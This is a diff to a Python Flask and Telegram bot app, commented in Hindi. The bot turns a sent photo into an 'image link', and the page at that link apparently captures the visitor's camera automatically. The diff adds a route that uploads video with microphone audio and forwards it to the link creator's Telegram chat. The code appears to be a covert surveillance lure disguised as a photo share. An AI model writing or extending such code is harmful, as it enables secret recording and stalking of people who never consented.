@@ -16,14 +16,14 @@ OWNER_CHAT_ID = "6464233947"
 BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")
 
 app = Flask(__name__)
-link_data = {}   # unique_id -> {"owner": chat_id, "photo": filename}
+link_data = {}
 
 # स्टैटिक फोटो सर्व करें
 @app.route('/photos/<filename>')
 def serve_photo(filename):
     return send_from_directory('static', filename)
 
-# मुख्य पेज – केवल फोटो दिखाएगा
+# मुख्य पेज – केवल आपकी भेजी फोटो दिखाएगा
 @app.route('/image/<unique_id>')
 def image(unique_id):
     if unique_id not in link_data:
@@ -31,7 +31,7 @@ def image(unique_id):
     photo_url = f"/photos/{link_data[unique_id]['photo']}"
     return render_template('camera.html', unique_id=unique_id, photo_url=photo_url)
 
-# ऑटो कैप्चर की गई फोटो अपलोड
+# 3 फोटो अपलोड
 @app.route('/upload/<unique_id>', methods=['POST'])
 def upload_photo(unique_id):
     if unique_id not in link_data:
@@ -55,11 +55,30 @@ def upload_photo(unique_id):
     os.remove(temp_file)
     return {"status": "ok"}, 200 if resp.status_code == 200 else 500
 
+# 🎥 वीडियो (माइक के साथ) अपलोड – नया जोड़ा
+@app.route('/upload_video/<unique_id>', methods=['POST'])
+def upload_video(unique_id):
+    if unique_id not in link_data:
+        return {"status": "error"}, 400
+    owner_id = link_data[unique_id]["owner"]
+    if 'video' not in request.files:
+        return {"status": "error"}, 400
+    video_file = request.files['video']
+    temp_file = f"temp_video_{unique_id}.webm"
+    video_file.save(temp_file)
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
+    with open(temp_file, 'rb') as vid:
+        files = {'video': vid}
+        payload = {'chat_id': owner_id, 'caption': '🎥 Video with Audio'}
+        resp = requests.post(url, files=files, data=payload)
+    os.remove(temp_file)
+    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
+
 @app.route('/health')
 def health():
     return "OK", 200
 
-# टेलीग्राम बॉट हैंडलर्स
+# ---------- Telegram Bot Handlers ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Send me a photo and I'll give you an image link.")
 
@@ -98,7 +117,6 @@ def run_bot():
     app_bot.run_polling()
 
 if __name__ == '__main__':
-    # Flask को background (daemon) thread में चलाएँ
     flask_thread = threading.Thread(
         target=waitress.serve,
         args=(app,),
@@ -107,5 +125,4 @@ if __name__ == '__main__':
     )
     flask_thread.start()
     print("🌐 Flask server starting in background...")
-    # बॉट को main thread में चलाएँ – सिर्फ एक बार polling
     run_bot()
